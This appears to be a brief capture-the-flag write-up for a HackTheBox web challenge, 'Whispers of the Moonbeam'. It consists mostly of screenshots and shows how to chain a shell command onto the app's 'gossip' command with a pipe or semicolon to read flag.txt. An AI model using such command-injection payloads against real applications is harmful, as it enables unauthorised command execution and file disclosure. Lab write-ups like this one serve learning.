---
title: Whispers of the Moonbeam
tags:
  - CTF
  - HackTheBox
  - CyberApocalypse
  - Web
date: 2025-03-21T00:00:00Z
---
![](Pasted%20image%2020250321215509.png)

![](Pasted%20image%2020250321215538.png)

![](Pasted%20image%2020250321215608.png)

With the command `gossip` we can view the contents of the directory, and we can pipe it to get the flag:

```shell
gossip | cat flag.txt
# or
gossip;cat flag.txt
```

![](Pasted%20image%2020250321220009.png)